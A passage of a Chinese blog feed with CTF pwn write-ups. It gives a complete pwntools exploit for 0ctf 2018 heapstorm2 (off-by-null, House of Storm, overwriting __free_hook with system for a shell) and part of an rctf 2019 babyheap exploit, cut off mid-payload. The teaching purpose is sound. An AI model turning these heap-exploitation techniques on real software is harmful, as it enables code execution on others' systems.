}}</code></pre><p>主函数里有个sub_BE6()函数，其中禁用了fastbin，并且用mmap在0x13370000处分配了大小为0x1000的chunk，从/dev/urandom中读取了3个随机数到0x13370800处，还调用了两个异或函数，由后面可知，是对chunk的头指针和size进行了异或加密，返回0x13370800给v4，这里相当于有四个随机数，第三个和第四个随机数相同</p><pre><code>__int64 sub_BE6(){  int i; // [rsp+8h] [rbp-18h]  int fd; // [rsp+Ch] [rbp-14h]  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  alarm(0x3Cu);  puts(    "    __ __ _____________   __   __    ___    ____\n"    "   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"    "  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n"    " / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n"    "/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n");  puts("===== HEAP STORM II =====");  if ( !mallopt(1, 0) )                         // 禁用fastbin    exit(-1);  if ( mmap(0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != 322371584 )    exit(-1);  fd = open("/dev/urandom", 0);  if ( fd &lt; 0 )    exit(-1);  if ( read(fd, 0x13370800, 0x18uLL) != 24 )    exit(-1);  close(fd);  MEMORY[0x13370818] = MEMORY[0x13370810];  for ( i = 0; i &lt;= 15; ++i )  {    *(16 * (i + 2LL) + 0x13370800) = ptr_xor(0x13370800, 0LL);    *(16 * (i + 2LL) + 0x13370808) = size_xor(0x13370800LL, 0LL);  }  return 0x13370800LL;}</code></pre><h4 id="ptr-xor"><a href="#ptr-xor" class="headerlink" title="ptr_xor()"></a>ptr_xor()</h4><pre><code>__int64 __fastcall ptr_xor(_QWORD *a1, __int64 a2){  return *a1 ^ a2;     //a1为第一个随机数}</code></pre><h4 id="size-xor"><a href="#size-xor" class="headerlink" title="size_xor()"></a>size_xor()</h4><pre><code>__int64 __fastcall size_xor(__int64 a1, __int64 a2){  return a2 ^ *(a1 + 8);//a1+8为第一个随机数}</code></pre><p>readd函数存在一个off-by-one</p><pre><code>unsigned __int64 __fastcall sub_1402(__int64 a1, __int64 a2){  __int64 v3; // rax  char buf; // [rsp+17h] [rbp-19h] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-18h]  ssize_t v6; // [rsp+20h] [rbp-10h]  unsigned __int64 v7; // [rsp+28h] [rbp-8h]  v7 = __readfsqword(0x28u);  if ( !a2 )    return 0LL;  v5 = 0LL;  while ( a2 - 1 &gt; v5 )  {    v6 = read(0, &amp;buf, 1uLL);    if ( v6 &gt; 0 )    {      if ( buf == 10 )        break;      v3 = v5++;      *(v3 + a1) = buf;    }    else if ( *_errno_location() != 11 &amp;&amp; *_errno_location() != 4 )    {      break;    }  }  *(a1 + v5) = 0;                               // off-by-null  return v5;}</code></pre><p>add函数<br>只能申请0xC 到0x1000的chunk，且chunk的头指针和size用 了异或加密，由上面的异或函数可知只是用了前两个随机数,并且我们看到chunk的头指针和size是 在0x13370800+4*0x8处开始存放的，按照mem指针+size顺序依次存放</p><pre><code>void __fastcall add(__int64 a1){  int i; // [rsp+10h] [rbp-10h]  int size; // [rsp+14h] [rbp-Ch]  void *v3; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  {    if ( !size_xor(a1, *(16 * (i + 2LL) + a1 + 8)) )    {      printf("Size: ");      size = chioce();      if ( size &gt; 12 &amp;&amp; size &lt;= 4096 )      {        v3 = calloc(size, 1uLL);        if ( !v3 )          exit(-1);        *(16 * (i + 2LL) + a1 + 8) = size_xor(a1, size);        *(16 * (i + 2LL) + a1) = ptr_xor(a1, v3);        printf("Chunk %d Allocated\n", i);      }      else      {        puts("Invalid Size");      }      return;    }  }}</code></pre><h4 id="edit函数-1"><a href="#edit函数-1" class="headerlink" title="edit函数"></a>edit函数</h4><p>读入的数据+12要小于等于申请时写的size,我们读入的数据会追加上一个12字节字符串再加上一个0结尾，所以存在off_by_null但是prev_size无法控制。</p><pre><code>int __fastcall edit(_QWORD *a1){  signed int v2; // [rsp+10h] [rbp-20h]  int v3; // [rsp+14h] [rbp-1Ch]  __int64 v4; // [rsp+18h] [rbp-18h]  printf("Index: ");  v2 = chioce();  if ( v2 &gt; 0xF || !size_xor(a1, a1[2 * v2 + 5]) )    return puts("Invalid Index");  printf("Size: ");  v3 = chioce();  if ( v3 &lt;= 0 || v3 &gt; (size_xor(a1, a1[2 * v2 + 5]) - 12) )    return puts("Invalid Size");  printf("Content: ");  v4 = ptr_xor(a1, a1[2 * v2 + 4]);  sub_1377(v4, v3);  strcpy((v3 + v4), "HEAPSTORM_II");  return printf("Chunk %d Updated\n", v2);}</code></pre><h4 id="free函数-1"><a href="#free函数-1" class="headerlink" title="free函数"></a>free函数</h4><p>不存在uaf</p><pre><code>int __fastcall sub_109B(_QWORD *a1){  void *v2; // rax  signed int v3; // [rsp+1Ch] [rbp-4h]  printf("Index: ");  v3 = chioce();  if ( v3 &gt; 0xF || !size_xor(a1, a1[2 * v3 + 5]) )    return puts("Invalid Index");  v2 = ptr_xor(a1, a1[2 * v3 + 4]);  free(v2);  a1[2 * v3 + 4] = ptr_xor(a1, 0LL);  a1[2 * v3 + 5] = size_xor(a1, 0LL);  return printf("Chunk %d Deleted\n", v3);}</code></pre><h4 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h4><p>需要满足 (a1[3] ^ a1[2]) == 0x13377331才能使用该函数，也就是第2个随机数和第3个随机数异或后为0x13377331才行</p><pre><code>    int __fastcall sub_11B5(_QWORD *a1){  __int64 v2; // rbx  __int64 v3; // rax  signed int v4; // [rsp+1Ch] [rbp-14h]  if ( (a1[3] ^ a1[2]) != 0x13377331LL )    return puts("Permission denied");  printf("Index: ");  v4 = chioce();  if ( v4 &gt; 0xF || !size_xor(a1, a1[2 * v4 + 5]) )    return puts("Invalid Index");  printf("Chunk[%d]: ", v4);  v2 = size_xor(a1, a1[2 * v4 + 5]);  v3 = ptr_xor(a1, a1[2 * v4 + 4]);  sub_14D4(v3, v2);  return puts(byte_180A);}</code></pre><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目保护全开，我们想到的是把free_hook改为system地址，而我们首先得泄露出libc基地址，就必须利用show函数，要想利用show函数，就必须修改第3个随机数和第4个随机数的值，使它们异或后为0x13377331，随机数是在0x13370800处，我们就想到要将chunk分配到0x13370800处，程序允许我们分配最大0x1000大小的chunk，可以使用House of storm来将chunk分配到0x13370800处，这样我们不仅控制了四个随机数，还控制了chunk的全局数组</p><h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>先把前面的东西写好</p><pre><code>#coding:utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./0ctf_2018_heapstorm2')libc = ELF('./libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim,data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim,data)r       = lambda num=4096           :sh.recv(num)rl      = lambda num=4096           :sh.recvline(num)ru      = lambda delims   :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))def dbg():    gdb.attach(sh)    pause()def add(size):    sla('Command: ','1')    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000def edit(idx,content):    sla('Command: ','2')    sla('Index: ',str(idx))    sla('Size: ',str(len(content)))    sa('Content: ',content)def free(idx):    sla('Command: ','3')    sla('Index: ',str(idx))def show(idx):    sla('Command: ','4')    sla('Index: ',str(idx))</code></pre><p>和上一题一样，先构造一个unsortedbin和largebin，并且利用off-by-null来实现控制unsortedbin chunk的bk指针和largebin chunk的bk和bk_size指针，然后再malloc chunk，将chunk分配到0x13370800处，这里要注意的是这道题的edit函数有点不同，会把我们输入的字节后面加上12字节再加一个’\x00’，所以我们每次edit都要少输入12字节即可实现0ff-by-null。</p><pre><code>#---------------布置chunk-------------------------#add(0x18)#0   add(0x508)#1add(0x18)#2add(0x18)#3   add(0x508)#4add(0x18)#5   add(0x18)#6   #----------------准备 unsorted chunk-----------------------#edit(1,'\x00'*0x4F0+p64(0x500)) free(1)edit(0,'\x00'*(0x18-12))add(0x18) #1 add(0x4d8) #7   free(1)   free(2) #1-2add(0x38)#1add(0x4e8)#2  #-------------------准备 large chunk-----------------------------------#edit(4,'\x00'*0x4F0+p64(0x500))free(4)edit(3,'\x00'*(0x18-12)) add(0x18) #4add(0x4d8) #8free(4)free(5) #4-5 add(0x48)#4  #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#free(2)add(0x4e8) free(2) #--------------修改他们是的满足条件进行 house of strom------------------------------#fake_chunk = 0x13370800 - 0x20payload = '\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)edit(7, payload) #修改unsorted chunk的bkpayload = '\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)edit(8, payload)  add(0x48) </code></pre><p>现在我们已经可以控制0x13370800处的值了，我们把这些随机数都改为0，然后把chunk_0改为0x13370800，以此来实现控制</p><pre><code>#-----------------------泄漏 libc----------------------------------##由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址payload = p64(0)*6 + p64(0x13370800)edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/5f044d56d0c44edb8e660e12e3bcaed3.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/5f044d56d0c44edb8e660e12e3bcaed3.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/e14aefc2bf3441d7a953157a9dfcd27a.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/e14aefc2bf3441d7a953157a9dfcd27a.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/f0caae54a60245fc93f7b19db749773b.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/f0caae54a60245fc93f7b19db749773b.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p>之后修改0x13370800处的第三个和第四个数分别为0和0x13377331，两者异或得到0x13377331，越过show函数的检查，此时已经可以使用show函数，因为我们要泄露的unsortedbin chunk的fd指针（指向main_arena+88），我们必须在chunk的全局数组中写入0x56104462a060来show，但是程序每次运行地址不同，由上图可知fake_chunk+3处存放的就是0x56104462a060，<br>所以我们需要利用fake_chunk+3（unsortedbin chunk的地址）来泄露libc，我们每次把chunk0的位置写为0x13370800，就可以实现每次通过chunk0来控制0x13370800</p><pre><code>payload = p64(0)*3 +p64(0x13377331)  #满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(fake_chunk+3) + p64(8)   #chunk1edit(0, payload) #满足show的条件show(1)  #我们刚刚house of storm 写的地址泄漏出来ru("]: ")heap = u64(r(6).ljust(8, '\x00'))success("heap:"+hex(heap))dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/cf60539043db433c95bc3f6a7ac6caff.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/cf60539043db433c95bc3f6a7ac6caff.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/29c15a75b6b34ba1988f64a95bdcf946.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/29c15a75b6b34ba1988f64a95bdcf946.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>此时我们成功泄露出unsortedbin chunk的地址，我们再修改全局数组为unsortedbin chunk的地址+0x10（main_arena+88），然后即可泄露处libc基地址</p><pre><code>payload  = p64(0)*3 + p64(0x13377331)#满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(heap+0x10) + p64(8) #chunk1edit(0, payload)show(1) #泄漏libc地址ru("]: ")malloc_hook = u64(r(6).ljust(8, '\x00')) -0x58 - 0x10libc_base = malloc_hook - libc.sym['__malloc_hook']free_hook = libc_base+libc.sym['__free_hook']system = libc_base+ libc.sym['system']success("free_hook:"+hex(free_hook))dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/aed1148758fa403a88ce058db848df8b.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/aed1148758fa403a88ce058db848df8b.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p>之后我们要做到就是在全局数组里写入free hook地址和/bin/sh，将其改为system，获得shell，free_hook在chunk0处，/bin/sh\x00在chunk1处</p><pre><code>#--------------修改 free_hook -----------------------------------#payload  = p64(0)*4payload += p64(free_hook) + p64(0x100)#chunk0payload += p64(0x13370800+0x40) + p64(8)#chunk1payload += '/bin/sh\x00'edit(0, payload)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/bb966a3843c24bdcac635f1a1d52c453.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/bb966a3843c24bdcac635f1a1d52c453.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后改free_hook为system，free(1)，获得shell</p><pre><code>edit(0, p64(system))free(1)itr()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/96b6b52cd2734f3b8c13806244a0c5fe.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/96b6b52cd2734f3b8c13806244a0c5fe.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code>#coding:utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./0ctf_2018_heapstorm2')libc = ELF('./libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim,data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim,data)r       = lambda num=4096           :sh.recv(num)rl      = lambda num=4096           :sh.recvline(num)ru      = lambda delims   :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))def dbg():        gdb.attach(sh)        pause()def add(size):    sla('Command: ','1')    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000def edit(idx,content):    sla('Command: ','2')    sla('Index: ',str(idx))    sla('Size: ',str(len(content)))    sa('Content: ',content)def free(idx):    sla('Command: ','3')    sla('Index: ',str(idx))def show(idx):    sla('Command: ','4')    sla('Index: ',str(idx))#---------------布置chunk-------------------------#add(0x18)#0 add(0x508)#1add(0x18)#2add(0x18)#3   add(0x508)#4add(0x18)#5   add(0x18)#6  #----------------准备 unsorted chunk-----------------------#edit(1,'\x00'*0x4F0+p64(0x500)) free(1)edit(0,'\x00'*(0x18-12))  add(0x18) #1 add(0x4d8) #7  free(1)   free(2) #1-2 合并  add(0x38)#1add(0x4e8)#2   #-------------------准备 large chunk-----------------------------------#edit(4,'\x00'*0x4F0+p64(0x500))#伪造chunkfree(4)edit(3,'\x00'*(0x18-12)) add(0x18) #4add(0x4d8) #8  free(4)free(5) #4-5 add(0x48)#4  #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#free(2)add(0x4e8) free(2)   #--------------修改他们是的满足条件进行 house of strom------------------------------#fake_chunk = 0x13370800 - 0x20payload = '\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)edit(7, payload) #修改unsorted chunk的bkpayload = '\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)edit(8, payload) #修改 large chunk 的 bk 和 bk_nextsizeadd(0x48)  #2  -&gt; 0x133707e0   成功将申请到了heaparray附近 #-----------------------泄漏 libc----------------------------------##由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址payload = p64(0)*6 + p64(0x13370800)edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0#dbg() payload = p64(0)*3 +p64(0x13377331)  #满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(fake_chunk+3) + p64(8)   #chunk1edit(0, payload) #满足show的条件#dbg()show(1)  #我们刚刚house of storm 写的地址泄漏出来ru("]: ")heap = u64(r(6).ljust(8, '\x00'))success("heap:"+hex(heap))#dbg()payload  = p64(0)*3 + p64(0x13377331)#满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(heap+0x10) + p64(8) #chunk1edit(0, payload)#dbg()show(1) #泄漏libc地址ru("]: ")malloc_hook = u64(r(6).ljust(8, '\x00')) -0x58 - 0x10libc_base = malloc_hook - libc.sym['__malloc_hook']free_hook = libc_base+libc.sym['__free_hook']system = libc_base+ libc.sym['system']success("free_hook:"+hex(free_hook)) #--------------修改 free_hook -----------------------------------#payload  = p64(0)*4payload += p64(free_hook) + p64(0x100)#chunk0payload += p64(0x13370800+0x40) + p64(8)#chunk1payload += '/bin/sh\x00'edit(0, payload)#dbg()edit(0, p64(system))free(1)itr()</code></pre><blockquote><p>参考文章<br><a href="https://www.anquanke.com/post/id/203096">House of storm 原理及利用</a><br><a href="https://www.freebuf.com/articles/system/209096.html">Largebin Attack</a><br><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">CTF-WIKI</a><br><a href="https://bbs.pediy.com/thread-262424.htm#msg_header_h1_2">Largebin attack总结</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;House-of-storm&quot;&gt;&lt;a href=&quot;#House-of-storm&quot; class=&quot;headerlink&quot; title=&quot;House of storm&quot;&gt;&lt;/a&gt;House of storm&lt;/h1&gt;&lt;p&gt;结合了unsorted_bin_attack</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Storm + 堆SROP + orw</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Storm+%E5%A0%86SROP+orw/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Storm+%E5%A0%86SROP+orw/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:43.801Z</updated>
    
    <content type="html"><![CDATA[<p><strong>同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，<br>若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。</strong></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf_2019_babyheap"></a>rctf_2019_babyheap</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。<br>看一下ida</p><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p>可以看到是实现了四个功能，增改删查</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  init(argc, argv, envp);  while ( 1 )  {    menu();    switch ( get_int() )    {      case 1:        add();        break;      case 2:        edit();        break;      case 3:        delete();        break;      case 4:        show();        break;      case 5:        puts("See you next time!");        exit(0);      default:        puts("Invalid choice!");        break;    }  }}</code></pre><h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><p>可以申请最大0x1000大小的chunk，最多申请16个chunk</p><pre><code>unsigned __int64 add(){  void **v0; // rbx  int i; // [rsp+0h] [rbp-20h]  int size; // [rsp+4h] [rbp-1Ch]  unsigned __int64 v4; // [rsp+8h] [rbp-18h]  v4 = __readfsqword(0x28u);  for ( i = 0; *(ptrs + 2 * i) &amp;&amp; i &lt;= 15; ++i )    ;  if ( i == 16 )  {    puts("You can't");    exit(-1);  }  printf("Size: ");  size = get_int();  if ( size &lt;= 0 || size &gt; 0x1000 )  {    puts("Invalid size :(");  }  else  {    *(ptrs + 4 * i + 2) = size;    v0 = (ptrs + 16 * i);    *v0 = calloc(size, 1uLL);    puts("Add success :)");  }  return __readfsqword(0x28u) ^ v4;}</code></pre><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><p>存在off-by-null漏洞</p><pre><code>unsigned __int64 edit(){  unsigned int v1; // [rsp+0h] [rbp-10h]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf("Index: ");  v1 = get_int();  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )  {    printf("Content: ");    *(*(ptrs + 2 * v1) + read_n(*(ptrs + 2 * v1), *(ptrs + 4 * v1 + 2))) = 0; //off-by-one    puts("Edit success :)");  }  else  {    puts("Invalid index :(");  }  return __readfsqword(0x28u) ^ v2;}</code></pre><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><pre><code>unsigned __int64 delete(){  unsigned int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf("Index: ");  v1 = get_int();  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )  {    free(*(ptrs + 2 * v1));    *(ptrs + 2 * v1) = 0LL;    *(ptrs + 4 * v1 + 2) = 0;    puts("Delete success :)");  }  else  {    puts("Invalid index :(");  }  return __readfsqword(0x28u) ^ v2;}</code></pre><h3 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h3><pre><code>unsigned __int64 show(){  unsigned int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf("Index: ");  v1 = get_int();  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )    puts(*(ptrs + 2 * v1));  else    puts("Invalid index :(");  return __readfsqword(0x28u) ^ v2;}</code></pre><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>看了大佬的博客<a href="https://blog.csdn.net/weixin_44145820/article/details/105709145">rctf_2019_babyheap</a>，这里对其进行详细的解析。<br class='item-img' data-src='https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>程序禁用了fastbin，且能申请最大为0x1000大小的chuck，可以使用house of storm，修改free_hook的地址为shellcode，执行shellcode，这里我们需要用orw来写shellcode，并且在这之前需要用mprotect函数修改free_hook段为可读可写可执行权限。</p><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>先把前面的写好</p><pre><code># coding=utf-8from pwn import *#sh = remote("node4.buuoj.cn", 29278)sh = process('./rctf_2019_babyheap')context(log_level = 'debug', arch = 'amd64', os = 'linux')elf = ELF("./rctf_2019_babyheap")libc = ELF('../../libc-2.23.so--64')def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims   :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data)) def add(size):    ru("Choice: \n")    sl('1')    ru("Size: ")    sl(str(size))def free(index):    ru("Choice: \n")    sl('3')    ru("Index: ")    sl(str(index))def show(index):    ru("Choice: \n")    sl('4')    ru("Index: ")    sl(str(index))def edit(index, content):    ru("Choice: \n")    sl('2')    ru("Index: ")    sl(str(index))    ru("Content: ")    s(content)</code></pre><h3 id="首先构造堆块重叠，泄露libc基地址"><a href="#首先构造堆块重叠，泄露libc基地址" class="headerlink" title="首先构造堆块重叠，泄露libc基地址"></a>首先构造堆块重叠，泄露libc基地址</h3><p>先申请四个chunk，申请的chunk真正大小分别为0x90,0x70,0x100,0x20,<br>chunk_3是为了free前三个chunk后防止堆块合并</p><pre><code>add(0x80)#0add(0x68)#1add(0xf0)#2add(0x18)#3dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>之后free chunk_0，此时因为禁用了fastbin，所以chunk_0直接进入了unsortedbin里，再利用off-by-null漏洞修改chunk_2的pre_size为0x100（chunk_0+chunk_1正好就是0x100），修改chunk_2的size为0x100，使他处于free状态。</p><pre><code>free(0)payload = 'a'*0x60 + p64(0x100)edit(1, payload)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>free chunk_2后，触发堆块前向合并，chunk_2的pre_size为是0x100,chunk_0和chunk_1加起来是0x100，就是前三个chunk合并。unsortedbin里存放着原chunk_0的起始地址。</p><pre><code>free(2)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>此时chunk_1是没有被free的，然后我们再次申请0x80（原chunk_0大小）大小的chunk，此时原chunk_1的mem区域存放着main_arena+88，因为chunk_1并没有被free，所以我们直接调用show函数即可泄露libc基地址。</p><pre><code>add(0x80)#0show(1)malloc_hook = u64(ru('\x7f').ljust(8, '\x00')) - 0x58 - 0x10libc.address = malloc_hook - libc.sym['__malloc_hook']system = libc.sym['system']free_hook = libc.sym['__free_hook']set_context = libc.symbols['setcontext']lg('libc_base',libc.address)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><h3 id="构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom"><a href="#构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom" class="headerlink" title="构造unsortbin chunk 和largebin chunk，进行 house of strom"></a>构造unsortbin chunk 和largebin chunk，进行 house of strom</h3><p>先申请0x160大小的chunk，将unsortbin中残余chunk清空，之后构造unsortbin chunk 和largebin chunk的调试过程请参考我另一篇文章<a href="https://blog.csdn.net/tbsqigongzi/article/details/126185571?spm=1001.2014.3001.5502">House of storm</a><br>此时我们已以可以修改free_hook处的值了</p><pre><code>#---------------布置chunk-------------------------#add(0x18)#4add(0x508)#5add(0x18)#6add(0x18)#7add(0x508)#8add(0x18)#9add(0x18)#10#dbg()#----------------准备 unsorted chunk-----------------------#edit(5, 'a'*0x4f0+p64(0x500))#dbg()free(5)edit(4, 'a'*0x18)#dbg()add(0x18)#5add(0x4d8)#11free(5)free(6)#dbg()add(0x30)#5add(0x4e8)#6#dbg()#-------------------准备 large chunk-----------------------------------#edit(8, 'a'*0x4f0+p64(0x500))free(8)edit(7, 'a'*0x18)add(0x18)#8add(0x4d8)#12free(8)free(9)add(0x40)#8#---------------unsorted chunk 和 large chunk 放到对应位置----------------------##dbg()free(6)#dbg()add(0x4e8)#6#dbg()free(6)#dbg()#pause()#--------------修改他们的满足条件进行 house of strom------------------------------#storage = free_hookfake_chunk = storage - 0x20payload = '\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + 